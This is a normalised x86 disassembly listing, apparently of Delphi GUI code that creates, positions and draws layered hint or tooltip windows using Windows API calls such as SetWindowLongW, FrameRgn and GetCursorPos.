push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x4 ] esi
mov eax [ edi ]
mov edx edi
call [ eax + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_480308
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43139c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_480384
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0xc ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
sub_4803dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_4804b6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test [ esi + 0x52 ] 0x10
je r-xdata
mov [ ebx + 0x178 ] 0x1
or [ ebx + 0x54 ] 0x4000
xor eax eax
cmp [ esi + 0x34 ] 0x0
setne al
jmp r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
mov ecx [ ebp - 0x8 ]
mov edx edi
mov ebx [ eax ]
call [ ebx + 0x98 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x10 ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x14 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
add ecx [ ebp - 0x8 ]
mov edx eax
add edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x98 ]
jmp r-xdata
test al al
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebx + 0x178 ] 0x0
and [ ebx + 0x54 ] 0xffffbfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4804c8
push ebx
push esi
push edi
mov ebx [ edx + 0x8 ]
mov esi [ edx ]
sub ebx esi
push ebx
mov ebx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ebx edi
push ebx
push ecx
mov ecx esi
mov edx edi
xchg edx ecx
call sub_4803dc
pop edi
pop esi
pop ebx
retn
sub_4804ec
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp edx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edi
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp ecx [ esi + 0xc ]
jne r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp edi [ esi + 0x14 ]
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_480528
push esi
xor ecx ecx
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_480546 ]
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
xor edx edx
cmp [ esi + 0x34 ] 0x0
setne dl
jmp r-xdata
mov ecx [ esi + 0x40 ]
jmp r-xdata
mov ecx [ esi + 0x40 ]
sub ecx [ eax + 0x8 ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x44 ]
jmp r-xdata
mov ecx [ esi + 0x44 ]
sub ecx [ eax + 0xc ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x48 ]
jmp r-xdata
mov ecx [ esi + 0x48 ]
add ecx [ eax + 0x8 ]
add ecx [ eax + 0x10 ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x4c ]
jmp r-xdata
mov ecx [ esi + 0x4c ]
add ecx [ eax + 0xc ]
add ecx [ eax + 0x14 ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x194 ]
jmp r-xdata
mov ecx [ esi + 0x194 ]
sub ecx [ eax + 0x8 ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x198 ]
jmp r-xdata
mov ecx [ esi + 0x198 ]
sub ecx [ eax + 0xc ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x19c ]
jmp r-xdata
mov ecx [ esi + 0x19c ]
add ecx [ eax + 0x8 ]
add ecx [ eax + 0x10 ]
jmp r-xdata
test dl dl
je r-xdata
mov ecx [ esi + 0x1a0 ]
mov ecx [ esi + 0x1a0 ]
add ecx [ eax + 0xc ]
add ecx [ eax + 0x14 ]
jmp r-xdata
test dl dl
je r-xdata
sub_4806d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47c590
xor edx edx
mov eax esi
call sub_470d70
mov edx 0x80ffff
mov eax esi
call sub_470fdc
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x7c ]
mov eax [ esi + 0x270 ]
call sub_44de18
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_44ce9c
xor edx edx
mov eax esi
call sub_4704a0
xor edx edx
mov eax esi
call sub_4704d4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_480774
push ebx
mov ebx eax
mov eax ebx
call sub_475ab8
call sub_485c78
call sub_485d84
test al al
je r-xdata
pop ebx
retn
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
or eax 0x80000
push eax
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
push 0x3
push 0x0
push 0xff00
mov eax ebx
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_480810
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov eax esi
call sub_4806bc
mov edx [ esp + 0xc ]
mov eax esi
call sub_47046c
mov edx [ esp + 0x8 ]
mov eax [ esp ]
sub edx eax
sar edx 0x1
jns r-xdata
add edx eax
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
sub edx eax
mov eax esi
call sub_470438
mov eax [ esi + 0x278 ]
cmp [ eax + 0x44 ] 0x1
jne r-xdata
adc eax 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49d4e4
sar eax 0x1
jns r-xdata
mov edx [ esi + 0x40 ]
add edx 0xa
mov eax esi
call sub_470438
cmp eax [ esi + 0x44 ]
setl bl
mov [ esi + 0x27c ] bl
test bl bl
je r-xdata
adc eax 0x0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x44 ]
sub edx [ esi + 0x4c ]
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
sub edx eax
mov eax esi
call sub_47046c
sub_4808b4
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ esp + 0x4 ]
push edi
lea eax [ esp + 0xc ]
push eax
mov esi [ esp + 0x8 ]
mov ecx esi
mov edx edi
mov eax esi
call sub_40ab90
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_480810
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_4808f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48094e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480955
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ReleaseDC
retn
sub_48095c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_477644
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf0 ]
pop esi
pop ebx
retn
sub_480980
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
xor eax eax
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
xor edi edi
mov ebp [ esi + 0x278 ]
cmp [ ebp + 0x34 ] 0x0
je r-xdata
cmp [ ebp + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1d ]
test al 0x1
setne al
mov [ esp + 0xc ] al
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x10 ]
movzx ebx [ eax + 0x1d ]
movzx edx [ r-xdata ]
or dl bl
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x40 ]
call sub_44c590
mov eax [ r-xdata ]
push eax
lea ecx [ ebp + 0x34 ]
lea edx [ esp + 0x14 ]
mov eax [ esi + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
cmp [ esp + 0xc ] 0x0
jne r-xdata
add [ esp + 0x4 ] edi
mov eax [ esp + 0x8 ]
add [ esp ] eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4704d4
mov edx [ esp ]
mov eax esi
call sub_4704a0
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ r-xdata ]
push eax
lea ecx [ ebp + 0x38 ]
lea edx [ esp + 0x14 ]
mov eax [ esi + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
mov eax [ esp + 0x18 ]
sub eax [ esp + 0x10 ]
add eax 0x8
cmp eax [ esp + 0x8 ]
jge r-xdata
mov eax [ esp + 0x18 ]
sub eax [ esp + 0x10 ]
add eax 0x8
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
add edi eax
add edi 0x4
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x10 ]
movzx ebx [ eax + 0x1d ]
movzx edx [ r-xdata ]
not edx
and dl bl
mov eax [ esi + 0x270 ]
mov eax [ eax + 0x40 ]
call sub_44c590
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
add edi eax
add edi 0x4
mov eax [ esp + 0x8 ]
sub_480ae4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
mov [ esi + 0x54 ] 0xffffffff
mov [ esi + 0x44 ] 0x1
xor eax eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] 0x1f4
mov [ esi + 0x50 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_480b34
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_480b94
mov [ esi + 0x5c ] 0x1
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
test bl bl
jle r-xdata
call sub_481768
mov eax [ esi + 0x48 ]
call sub_43bf5c
mov eax [ esi + 0x48 ]
call sub_4055f0
xor eax eax
mov [ esi + 0x48 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_480ba0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_43c52c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x3c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_480acc
sub_480bcc
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
lea eax [ ebp - 0x1c ]
push eax
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ ebp - 0x5c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x4c ]
mov dl 0x3
call sub_40a9c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov eax [ eax + 0x48 ]
mov edx 0xf0ffff
call sub_44cd1c
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call CreateRectRgn
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44df24
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_480e01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov eax [ eax + 0x48 ]
xor edx edx
call sub_44cd1c
push 0x1
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov eax [ eax + 0x48 ]
call sub_44cd7c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44df24
push eax
call FrameRgn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x3fe00000
push 0x0
lea ecx [ ebp - 0x2c ]
mov dl 0x2
lea eax [ ebp - 0x1c ]
call sub_40aa24
jmp r-xdata
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x3fe00000
push 0x0
lea ecx [ ebp - 0x3c ]
mov dl 0x3
lea eax [ ebp - 0x1c ]
call sub_40aa24
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov eax [ eax + 0x48 ]
mov dl 0x1
call sub_44ce9c
mov eax [ r-xdata ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x280 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
lea ecx [ ebp - 0x5c ]
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x2c ]
call sub_40aad4
lea esi [ ebp - 0x5c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ r-xdata ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x280 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
mov eax [ r-xdata ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x284 ]
lea edx [ ebp - 0x4c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
lea ecx [ ebp - 0x5c ]
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x3c ]
call sub_40aad4
lea esi [ ebp - 0x5c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ r-xdata ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x284 ]
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ebx [ eax ]
call [ ebx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480e08
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44df24
push eax
call SelectObject
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
sub_480e20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480f5d
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480f64
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_4068c4
retn
mov eax esi
call sub_472370
cmp ebx eax
jne r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
cmp [ esi + 0x80 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x4c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_47085c
adc eax 0x0
mov edx [ esi + 0x80 ]
mov eax r-xdata
call sub_417b94
mov edi eax
lea edx [ ebp - 0x14 ]
mov eax [ esi + 0x80 ]
call sub_46d7a4
mov edx [ ebp - 0x14 ]
lea eax [ ebx + 0x34 ]
call sub_4070a8
test edi edi
je r-xdata
lea eax [ ebx + 0x38 ]
xor edx edx
call sub_4070a8
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x80 ]
call sub_46d7ec
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x38 ]
call sub_4070a8
jmp r-xdata
mov [ ebx + 0x40 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
lea edx [ edi + 0x1 ]
mov ecx 0x7fffffff
mov eax [ ebx + 0x38 ]
call sub_4077d0
mov eax [ ebp - 0x1c ]
call sub_411b70
mov [ ebx + 0x40 ] eax
lea eax [ ebx + 0x38 ]
push eax
mov ecx edi
dec ecx
xor edx edx
mov eax [ ebx + 0x38 ]
call sub_4077d0
jmp r-xdata
mov edx [ ebx + 0x38 ]
mov eax r-xdata
call sub_417b94
mov edi eax
test edi edi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_481014
mov [ ebx + 0x58 ] esi
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
jmp r-xdata
sub_480f7c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x50 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4806d4
mov esi eax
mov [ esi + 0x278 ] ebx
mov eax esi
call sub_479cbc
lea eax [ esi + 0x280 ]
mov edx [ ebx + 0x34 ]
call sub_4070a8
lea eax [ esi + 0x284 ]
mov edx [ ebx + 0x38 ]
call sub_4070a8
mov eax [ ebx + 0x40 ]
mov [ esi + 0x288 ] eax
mov edx esp
mov eax esi
call sub_480810
mov [ ebx + 0x5c ] 0x0
mov eax [ ebx + 0x48 ]
test eax eax
jne r-xdata
mov edx esi
call sub_48175c
mov eax [ ebx + 0x48 ]
call sub_481768
push ebx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_481068
mov [ ebx + 0x48 ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_481014
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ esp + 0x4 ]
push edi
lea eax [ esp + 0xc ]
push eax
mov esi [ esp + 0x8 ]
mov ecx esi
mov edx edi
mov eax esi
call sub_40ab90
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_480f7c
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_481068
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43b2fc
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f338
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ee8
mov esi eax
mov [ ebx + 0x40 ] esi
mov [ esi + 0x20 ] 0x1
mov edx edi
mov eax ebx
call sub_48175c
mov [ ebx + 0x48 ] 0x0
mov [ ebx + 0x49 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x44 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4810ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
call sub_405bb4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_481768
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43b400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_481179
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481180
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4305a0
call sub_4055f0
inc esi
dec ebx
jne r-xdata
sub_481180
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431040
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_4055f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_4055f0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_405b5c
sub_4811b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4812b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_48126e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481275
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
xor edx edx
mov eax edi
call sub_4305a0
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4303e0
xor edx edx
mov eax edi
call sub_430438
xor edx edx
mov eax edi
call sub_4305a0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
cmp esi eax
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_481275
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4812bf
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4305a0
push eax
push sub_4055f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43bb10
inc esi
dec ebx
jne r-xdata
sub_4812cc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x12 ] 0x1
push ebp
call sub_4811b8
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_4816fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_47a060
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
mov eax [ eax + 0x4c ]
push eax
call Sleep
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
push 0x3
push 0x0
push 0xff00
mov eax [ ebp - 0x10 ]
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_43f384
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
push sub_4055f0
